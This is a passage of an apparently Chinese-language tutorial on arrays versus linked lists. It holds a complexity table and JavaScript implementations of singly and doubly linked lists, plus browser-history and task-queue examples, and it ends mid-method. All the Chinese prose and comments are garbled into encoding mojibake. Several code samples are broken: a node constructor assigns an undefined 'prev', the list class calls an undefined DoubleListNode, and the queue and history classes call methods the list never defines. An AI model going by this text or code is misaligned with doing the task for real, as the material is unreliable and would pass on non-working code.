    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(data[i]); <span class="hljs-comment">// æ•°ç»„å¾ˆå¿«ï¼</span>
}
</code></pre>
<p>é‚£ä¹ˆé—®é¢˜æ¥äº†ï¼šæœ‰æ²¡æœ‰ä¸€ç§æ•°æ®ç»“æ„ï¼Œæ’å…¥å’Œåˆ é™¤å¿«ï¼Œé¡ºåºè®¿é—®ä¹Ÿå¿«ï¼Ÿå½“ç„¶æœ‰ï¼Œç­”æ¡ˆå°±æ˜¯ï¼š<strong>é“¾è¡¨</strong>ï¼
æ•°ç»„å’Œé“¾è¡¨æ˜¯ç¼–ç¨‹ä¸­æœ€åŸºç¡€çš„ä¸¤ç§æ•°æ®ç»“æ„ï¼Œç†è§£å®ƒä»¬çš„å·®å¼‚èƒ½å¸®åŠ©æˆ‘ä»¬åœ¨ä¸åŒåœºæ™¯ä¸‹åšå‡ºæœ€ä¼˜é€‰æ‹©ã€‚</p>
<h2 data-id="heading-1">ç†è§£æ•°ç»„ä¸é“¾è¡¨çš„æœ¬è´¨å·®å¼‚</h2>
<h3 data-id="heading-2">å†…å­˜ç»“æ„å¯¹æ¯”</h3>
<p>æˆ‘ä»¬å…ˆé€šè¿‡ä¸€ä¸ªç®€å›¾ï¼Œè§‚å¯Ÿä¸€ä¸‹æ•°ç»„å’Œé“¾è¡¨åœ¨å†…å­˜ä¸­çš„å­˜å‚¨æ–¹å¼ï¼š</p>
<h4 data-id="heading-3">æ•°ç»„çš„å†…å­˜ç»“æ„ï¼ˆè¿ç»­å­˜å‚¨ï¼‰</h4>
<pre><code class="hljs language-text" lang="text">â”Œâ”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”
â”‚  0  â”‚  1  â”‚  2  â”‚  3  â”‚  4  â”‚ â† ç´¢å¼•
â”œâ”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”¤
â”‚  10 â”‚  20 â”‚  30 â”‚  40 â”‚  50 â”‚ â† å€¼
â””â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”˜
åœ°å€: 1000 1004 1008 1012 1016 ï¼ˆå‡è®¾æ¯ä¸ªå…ƒç´ å 4å­—èŠ‚ï¼‰
</code></pre>
<h5 data-id="heading-4">æ•°ç»„çš„å­˜å‚¨ç‰¹ç‚¹ï¼š</h5>
<ol>
<li>è¿ç»­çš„å†…å­˜ç©ºé—´</li>
<li>é€šè¿‡ç´¢å¼•ç›´æ¥è®¡ç®—åœ°å€ï¼šåœ°å€ = åŸºåœ°å€ + ç´¢å¼• Ã— å…ƒç´ å¤§å°</li>
<li>éšæœºè®¿é—®æ—¶é—´å¤æ‚åº¦ï¼šO(1)</li>
</ol>
<h4 data-id="heading-5">é“¾è¡¨çš„å†…å­˜ç»“æ„ï¼ˆéè¿ç»­å­˜å‚¨ï¼‰</h4>
<pre><code class="hljs language-text" lang="text">      â”Œâ”€â”€â”€â”€â”€â”    â”Œâ”€â”€â”€â”€â”€â”    â”Œâ”€â”€â”€â”€â”€â”
å¤´ â†’  â”‚  10 â”‚ â†’  â”‚  20 â”‚ â†’  â”‚  30 â”‚ â†’ null
      â””â”€â”€â”€â”€â”€â”˜    â””â”€â”€â”€â”€â”€â”˜    â””â”€â”€â”€â”€â”€â”˜
åœ°å€:  2000       3040       4080  ï¼ˆåœ°å€ä¸è¿ç»­ï¼‰
</code></pre>
<h5 data-id="heading-6">é“¾è¡¨çš„ç‰¹ç‚¹</h5>
<ol>
<li>éè¿ç»­çš„å†…å­˜ç©ºé—´</li>
<li>æ¯ä¸ªèŠ‚ç‚¹åŒ…å«æ•°æ®å’ŒæŒ‡å‘ä¸‹ä¸€ä¸ªèŠ‚ç‚¹çš„æŒ‡é’ˆ</li>
<li>éšæœºè®¿é—®éœ€è¦éå†ï¼šO(n)</li>
<li>æ’å…¥å’Œåˆ é™¤åªéœ€è¦ä¿®æ”¹æŒ‡é’ˆï¼šO(1)</li>
</ol>
<h3 data-id="heading-7">æ—¶é—´å¤æ‚åº¦å¯¹æ¯”è¡¨</h3>




























































<table><thead><tr><th>æ•°æ®ç»“æ„</th><th>è®¿é—®</th><th>æ’å…¥å¼€å¤´</th><th>æ’å…¥ç»“å°¾</th><th>æ’å…¥ä¸­é—´</th><th>åˆ é™¤å¼€å¤´</th><th>åˆ é™¤ç»“å°¾</th><th>åˆ é™¤ä¸­é—´</th><th>æœç´¢</th></tr></thead><tbody><tr><td>æ•°ç»„</td><td>O(1)</td><td>O(n)</td><td>O(1)</td><td>O(n)</td><td>O(n)</td><td>O(1)</td><td>O(n)</td><td>O(n)</td></tr><tr><td>å•å‘é“¾è¡¨</td><td>O(n)</td><td>O(1)</td><td>O(n)</td><td>O(n)</td><td>O(1)</td><td>O(n)</td><td>O(n)</td><td>O(n)</td></tr><tr><td>åŒå‘é“¾è¡¨</td><td>O(n)</td><td>O(1)</td><td>O(1)</td><td>O(n)</td><td>O(1)</td><td>O(1)</td><td>O(n)</td><td>O(n)</td></tr><tr><td>å¸¦å°¾æŒ‡é’ˆçš„å•å‘é“¾è¡¨</td><td>O(n)</td><td>O(1)</td><td>O(1)</td><td>O(n)</td><td>O(1)</td><td>O(n)</td><td>O(n)</td><td>O(n)</td></tr></tbody></table>
<h4 data-id="heading-8">å…³é”®å·®å¼‚æ€»ç»“</h4>
<ol>
<li>éšæœºè®¿é—®å…ƒç´ ï¼šæ•°ç»„å®Œèƒœï¼ˆO(1) vs O(n)ï¼‰</li>
<li>æ’å…¥/åˆ é™¤å¼€å¤´ï¼šé“¾è¡¨å®Œèƒœï¼ˆO(1) vs O(n)ï¼‰</li>
<li>æ’å…¥/åˆ é™¤ç»“å°¾ï¼šæ•°ç»„å’ŒåŒå‘é“¾è¡¨éƒ½å¾ˆå¿«</li>
<li>æ’å…¥/åˆ é™¤ä¸­é—´ï¼šéƒ½ä¸å¿«ï¼Œä½†é“¾è¡¨ç¨å¥½</li>
<li>å†…å­˜ä½¿ç”¨ï¼šæ•°ç»„æ›´ç´§å‡‘ï¼Œé“¾è¡¨æœ‰æŒ‡é’ˆå¼€é”€</li>
</ol>
<h2 data-id="heading-9">å®ç°å•å‘é“¾è¡¨</h2>
<h3 data-id="heading-10">åŸºç¡€èŠ‚ç‚¹ç±»</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">ListNode</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">value, next = <span class="hljs-literal">null</span></span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">value</span> = value;  <span class="hljs-comment">// å­˜å‚¨çš„æ•°æ®</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">next</span> = next;    <span class="hljs-comment">// æŒ‡å‘ä¸‹ä¸€ä¸ªèŠ‚ç‚¹çš„æŒ‡é’ˆ</span>
  }
}
</code></pre>
<h3 data-id="heading-11">å•å‘é“¾è¡¨ç±»</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">LinkedList</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">head</span> = <span class="hljs-literal">null</span>;    <span class="hljs-comment">// é“¾è¡¨å¤´èŠ‚ç‚¹</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">length</span> = <span class="hljs-number">0</span>;     <span class="hljs-comment">// é“¾è¡¨é•¿åº¦</span>
  }

  <span class="hljs-comment">// è·å–é“¾è¡¨é•¿åº¦</span>
  <span class="hljs-keyword">get</span> <span class="hljs-title function_">size</span>() {
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">length</span>;
  }

  <span class="hljs-comment">// åœ¨é“¾è¡¨å¤´éƒ¨æ·»åŠ èŠ‚ç‚¹</span>
  <span class="hljs-title function_">addFirst</span>(<span class="hljs-params">value</span>) {
    <span class="hljs-comment">// åˆ›å»ºæ–°èŠ‚ç‚¹ï¼ŒæŒ‡å‘åŸæ¥çš„å¤´èŠ‚ç‚¹</span>
    <span class="hljs-keyword">const</span> newNode = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ListNode</span>(value, <span class="hljs-variable language_">this</span>.<span class="hljs-property">head</span>);
    <span class="hljs-comment">// æ›´æ–°å¤´èŠ‚ç‚¹ä¸ºæ–°èŠ‚ç‚¹</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">head</span> = newNode;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">length</span>++;
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>;
  }

  <span class="hljs-comment">// åœ¨é“¾è¡¨å°¾éƒ¨æ·»åŠ èŠ‚ç‚¹</span>
  <span class="hljs-title function_">addLast</span>(<span class="hljs-params">value</span>) {
    <span class="hljs-keyword">const</span> newNode = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ListNode</span>(value);
    <span class="hljs-comment">// å¦‚æœé“¾è¡¨ä¸ºç©ºï¼Œæ–°èŠ‚ç‚¹å°±æ˜¯å¤´èŠ‚ç‚¹</span>
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">head</span> == <span class="hljs-literal">null</span>) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">head</span> = newNode;
    } <span class="hljs-keyword">else</span> {
      <span class="hljs-comment">// æ‰¾åˆ°æœ€åä¸€ä¸ªèŠ‚ç‚¹</span>
      <span class="hljs-keyword">let</span> current = <span class="hljs-variable language_">this</span>.<span class="hljs-property">head</span>;
      <span class="hljs-keyword">while</span> (current.<span class="hljs-property">next</span> != <span class="hljs-literal">null</span>) {
        current = current.<span class="hljs-property">next</span>;
      }
      <span class="hljs-comment">// å°†æ–°èŠ‚ç‚¹æ·»åŠ åˆ°æœ«å°¾</span>
      current.<span class="hljs-property">next</span> = newNode;
    }
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">length</span>++;
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>;
  }

  <span class="hljs-comment">// åˆ é™¤å¤´èŠ‚ç‚¹</span>
  <span class="hljs-title function_">removeFirst</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">head</span> == <span class="hljs-literal">null</span>) {
      <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
    }
    <span class="hljs-keyword">const</span> removedValue = <span class="hljs-variable language_">this</span>.<span class="hljs-property">head</span>.<span class="hljs-property">value</span>;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">head</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">head</span>.<span class="hljs-property">next</span>;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">length</span>--;

    <span class="hljs-keyword">return</span> removedValue;
  }

  <span class="hljs-comment">// åˆ é™¤å°¾èŠ‚ç‚¹</span>
  <span class="hljs-title function_">removeLast</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">head</span> == <span class="hljs-literal">null</span>) {
      <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
    }
    <span class="hljs-comment">// å¦‚æœåªæœ‰ä¸€ä¸ªèŠ‚ç‚¹</span>
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">head</span>.<span class="hljs-property">next</span> == <span class="hljs-literal">null</span>) {
      <span class="hljs-keyword">const</span> removedValue = <span class="hljs-variable language_">this</span>.<span class="hljs-property">head</span>.<span class="hljs-property">value</span>;
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">head</span> = <span class="hljs-literal">null</span>;
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">length</span>--;
      <span class="hljs-keyword">return</span> removedValue;
    }
    <span class="hljs-comment">// æ‰¾åˆ°å€’æ•°ç¬¬äºŒä¸ªèŠ‚ç‚¹</span>
    <span class="hljs-keyword">let</span> current = <span class="hljs-variable language_">this</span>.<span class="hljs-property">head</span>;
    <span class="hljs-keyword">while</span> (current.<span class="hljs-property">next</span>.<span class="hljs-property">next</span> != <span class="hljs-literal">null</span>) {
      current = current.<span class="hljs-property">next</span>;
    }
    <span class="hljs-keyword">const</span> removedValue = current.<span class="hljs-property">next</span>.<span class="hljs-property">value</span>;
    current.<span class="hljs-property">next</span> = <span class="hljs-literal">null</span>;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">length</span>--;
    <span class="hljs-keyword">return</span> removedValue;
  }
}
</code></pre>
<h3 data-id="heading-12">å•å‘é“¾è¡¨çš„å®é™…åº”ç”¨</h3>
<h4 data-id="heading-13">åº”ç”¨1ï¼šæµè§ˆå™¨å†å²è®°å½•</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">BrowserHistory</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">history</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LinkedList</span>();
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">current</span> = <span class="hljs-literal">null</span>;
  }

  <span class="hljs-comment">// è®¿é—®æ–°é¡µé¢</span>
  <span class="hljs-title function_">visit</span>(<span class="hljs-params">url</span>) {
    <span class="hljs-comment">// å¦‚æœå½“å‰æœ‰é¡µé¢ï¼Œæ·»åŠ åˆ°å†å²è®°å½•</span>
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">current</span> !== <span class="hljs-literal">null</span>) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">history</span>.<span class="hljs-title function_">addLast</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">current</span>);
    }
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">current</span> = url;
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`è®¿é—®: <span class="hljs-subst">${url}</span>`</span>);
  }

  <span class="hljs-comment">// åé€€</span>
  <span class="hljs-title function_">back</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">history</span>.<span class="hljs-property">size</span> === <span class="hljs-number">0</span>) {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'æ— æ³•åé€€ï¼šå·²ç»æ˜¯ç¬¬ä¸€é¡µ'</span>);
      <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
    }
    <span class="hljs-keyword">const</span> previous = <span class="hljs-variable language_">this</span>.<span class="hljs-property">history</span>.<span class="hljs-title function_">removeLast</span>();
    <span class="hljs-keyword">const</span> current = <span class="hljs-variable language_">this</span>.<span class="hljs-property">current</span>;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">current</span> = previous;
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`åé€€: <span class="hljs-subst">${current}</span> â†’ <span class="hljs-subst">${previous}</span>`</span>);
    <span class="hljs-keyword">return</span> previous;
  }

  <span class="hljs-comment">// æŸ¥çœ‹å†å²è®°å½•</span>
  <span class="hljs-title function_">showHistory</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'å†å²è®°å½•:'</span>);
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">history</span>.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">url, index</span>) =&gt;</span> {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`  <span class="hljs-subst">${index + <span class="hljs-number">1</span>}</span>. <span class="hljs-subst">${url}</span>`</span>);
    });
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`å½“å‰: <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.current}</span>`</span>);
  }
}

</code></pre>
<h4 data-id="heading-14">åº”ç”¨2ï¼šä»»åŠ¡é˜Ÿåˆ—</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">TaskQueue</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">queue</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LinkedList</span>();
  }

  <span class="hljs-comment">// æ·»åŠ ä»»åŠ¡</span>
  <span class="hljs-title function_">enqueue</span>(<span class="hljs-params">task</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">queue</span>.<span class="hljs-title function_">addLast</span>(task);
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`æ·»åŠ ä»»åŠ¡: <span class="hljs-subst">${task.name}</span>`</span>);
  }

  <span class="hljs-comment">// æ‰§è¡Œä¸‹ä¸€ä¸ªä»»åŠ¡</span>
  <span class="hljs-title function_">dequeue</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">queue</span>.<span class="hljs-title function_">isEmpty</span>()) {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'ä»»åŠ¡é˜Ÿåˆ—ä¸ºç©º'</span>);
      <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
    }

    <span class="hljs-keyword">const</span> task = <span class="hljs-variable language_">this</span>.<span class="hljs-property">queue</span>.<span class="hljs-title function_">removeFirst</span>();
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`æ‰§è¡Œä»»åŠ¡: <span class="hljs-subst">${task.name}</span>`</span>);

    <span class="hljs-comment">// æ¨¡æ‹Ÿä»»åŠ¡æ‰§è¡Œ</span>
    <span class="hljs-keyword">try</span> {
      task.<span class="hljs-title function_">execute</span>();
    } <span class="hljs-keyword">catch</span> (error) {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">`ä»»åŠ¡æ‰§è¡Œå¤±è´¥: <span class="hljs-subst">${error.message}</span>`</span>);
    }

    <span class="hljs-keyword">return</span> task;
  }

  <span class="hljs-comment">// æŸ¥çœ‹ä¸‹ä¸€ä¸ªä»»åŠ¡ï¼ˆä¸æ‰§è¡Œï¼‰</span>
  <span class="hljs-title function_">peek</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">queue</span>.<span class="hljs-title function_">isEmpty</span>()) {
      <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
    }
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">queue</span>.<span class="hljs-title function_">get</span>(<span class="hljs-number">0</span>);
  }

  <span class="hljs-comment">// æ¸…ç©ºä»»åŠ¡é˜Ÿåˆ—</span>
  <span class="hljs-title function_">clear</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">queue</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LinkedList</span>();
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'ä»»åŠ¡é˜Ÿåˆ—å·²æ¸…ç©º'</span>);
  }

  <span class="hljs-comment">// è·å–é˜Ÿåˆ—é•¿åº¦</span>
  <span class="hljs-keyword">get</span> <span class="hljs-title function_">size</span>() {
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">queue</span>.<span class="hljs-property">size</span>;
  }

  <span class="hljs-comment">// æ‰“å°é˜Ÿåˆ—çŠ¶æ€</span>
  <span class="hljs-title function_">printQueue</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'å½“å‰ä»»åŠ¡é˜Ÿåˆ—:'</span>);
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">queue</span>.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">task, index</span>) =&gt;</span> {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`  <span class="hljs-subst">${index + <span class="hljs-number">1</span>}</span>. <span class="hljs-subst">${task.name}</span>`</span>);
    });
  }
}

</code></pre>
<h2 data-id="heading-15">å®ç°åŒå‘é“¾è¡¨</h2>
<h3 data-id="heading-16">åŸºç¡€èŠ‚ç‚¹ç±»</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">ListNode</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">value, next = <span class="hljs-literal">null</span></span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">value</span> = value;  <span class="hljs-comment">// å­˜å‚¨çš„æ•°æ®</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">next</span> = next;    <span class="hljs-comment">// æŒ‡å‘ä¸‹ä¸€ä¸ªèŠ‚ç‚¹çš„æŒ‡é’ˆ</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">prev</span> = prev;    <span class="hljs-comment">// æŒ‡å‘å‰ä¸€ä¸ªèŠ‚ç‚¹çš„æŒ‡é’ˆ</span>
  }
}
</code></pre>
<h3 data-id="heading-17">åŒå‘é“¾è¡¨ç±»</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">DoublyLinkedList</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">head</span> = <span class="hljs-literal">null</span>;    <span class="hljs-comment">// é“¾è¡¨å¤´èŠ‚ç‚¹</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">tail</span> = <span class="hljs-literal">null</span>;    <span class="hljs-comment">// é“¾è¡¨å°¾èŠ‚ç‚¹</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">length</span> = <span class="hljs-number">0</span>;     <span class="hljs-comment">// é“¾è¡¨é•¿åº¦</span>
  }

  <span class="hljs-keyword">get</span> <span class="hljs-title function_">size</span>() {
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">length</span>;
  }

  <span class="hljs-comment">// åœ¨å¤´éƒ¨æ·»åŠ èŠ‚ç‚¹</span>
  <span class="hljs-title function_">addFirst</span>(<span class="hljs-params">value</span>) {
    <span class="hljs-keyword">const</span> newNode = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DoubleListNode</span>(value, <span class="hljs-literal">null</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">head</span>);

    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">head</span> !== <span class="hljs-literal">null</span>) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">head</span>.<span class="hljs-property">prev</span> = newNode;
    } <span class="hljs-keyword">else</span> {
      <span class="hljs-comment">// å¦‚æœé“¾è¡¨ä¸ºç©ºï¼Œæ–°èŠ‚ç‚¹ä¹Ÿæ˜¯å°¾èŠ‚ç‚¹</span>
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">tail</span> = newNode;
    }

    <span class="hljs-variable language_">this</span>.<span class="hljs-property">head</span> = newNode;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">length</span>++;
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>;
  }

  <span class="hljs-comment">// åœ¨å°¾éƒ¨æ·»åŠ èŠ‚ç‚¹</span>
  <span class="hljs-title function_">addLast</span>(<span class="hljs-params">value</span>) {
    <span class="hljs-keyword">const</span> newNode = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DoubleListNode</span>(value, <span class="hljs-variable language_">this</span>.<span class="hljs-property">tail</span>, <span class="hljs-literal">null</span>);

    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">tail</span> !== <span class="hljs-literal">null</span>) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">tail</span>.<span class="hljs-property">next</span> = newNode;
    } <span class="hljs-keyword">else</span> {
      <span class="hljs-comment">// å¦‚æœé“¾è¡¨ä¸ºç©ºï¼Œæ–°èŠ‚ç‚¹ä¹Ÿæ˜¯å¤´èŠ‚ç‚¹</span>
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">head</span> = newNode;
    }

    <span class="hljs-variable language_">this</span>.<span class="hljs-property">tail</span> = newNode;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">length</span>++;
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>;
  }

  <span class="hljs-comment">// åˆ é™¤å¤´èŠ‚ç‚¹</span>
  <span class="hljs-title function_">removeFirst</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">head</span> === <span class="hljs-literal">null</span>) {
      <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
    }

    <span class="hljs-keyword">const</span> removedValue = <span class="hljs-variable language_">this</span>.<span class="hljs-property">head</span>.<span class="hljs-property">value</span>;

    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">head</span> === <span class="hljs-variable language_">this</span>.<span class="hljs-property">tail</span>) {
      <span class="hljs-comment">// åªæœ‰ä¸€ä¸ªèŠ‚ç‚¹</span>
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">head</span> = <span class="hljs-literal">null</span>;
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">tail</span> = <span class="hljs-literal">null</span>;
    } <span class="hljs-keyword">else</span> {
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">head</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">head</span>.<span class="hljs-property">next</span>;
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">head</span>.<span class="hljs-property">prev</span> = <span class="hljs-literal">null</span>;
    }

    <span class="hljs-variable language_">this</span>.<span class="hljs-property">length</span>--;
    <span class="hljs-keyword">return</span> removedValue;
  }

  <span class="hljs-comment">// åˆ é™¤å°¾èŠ‚ç‚¹</span>
  <span class="hljs-title function_">removeLast</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">tail</span> === <span class="hljs-literal">null</span>) {
      <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
    }

    <span class="hljs-keyword">const</span> removedValue = <span class="hljs-variable language_">this</span>.<span class="hljs-property">tail</span>.<span class="hljs-property">value</span>;

    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">head</span> === <span class="hljs-variable language_">this</span>.<span class="hljs-property">tail</span>) {
      <span class="hljs-comment">// åªæœ‰ä¸€ä¸ªèŠ‚ç‚¹</span>
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">head</span> = <span class="hljs-literal">null</span>;
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">tail</span> = <span class="hljs-literal">null</span>;
    } <span class="hljs-keyword">else</span> {
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">tail</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">tail</span>.<span class="hljs-property">prev</span>;
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">tail</span>.<span class="hljs-property">next</span> = <span class="hljs-literal">null</span>;
    }

    <span class="hljs-variable language_">this</span>.<span class="hljs-property">length</span>--;
    <span class="hljs-keyword">return</span> removedValue;
  }
}
</code></pre>
<h3 data-id="heading-18">åŒå‘é“¾è¡¨çš„å®é™…åº”ç”¨</h3>
<h4 data-id="heading-19">åº”ç”¨1ï¼šæµè§ˆå™¨å†å²è®°å½•ï¼ˆå¢å¼ºç‰ˆï¼‰</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">EnhancedBrowserHistory</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">history</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DoublyLinkedList</span>();
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">current</span> = <span class="hljs-literal">null</span>;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">currentIndex</span> = -<span class="hljs-number">1</span>;
  }

  <span class="hljs-comment">// è®¿é—®æ–°é¡µé¢</span>
  <span class="hljs-title function_">visit</span>(<span class="hljs-params">url</span>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`è®¿é—®: <span class="hljs-subst">${url}</span>`</span>);

    <span class="hljs-comment">// å¦‚æœå½“å‰ä½ç½®ä¸åœ¨æœ«å°¾ï¼Œéœ€è¦æˆªæ–­åé¢çš„å†å²</span>
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">currentIndex</span> &lt; <span class="hljs-variable language_">this</span>.<span class="hljs-property">history</span>.<span class="hljs-property">size</span> - <span class="hljs-number">1</span>) {
      <span class="hljs-comment">// ç§»é™¤å½“å‰ä½ç½®ä¹‹åçš„æ‰€æœ‰å†å²</span>
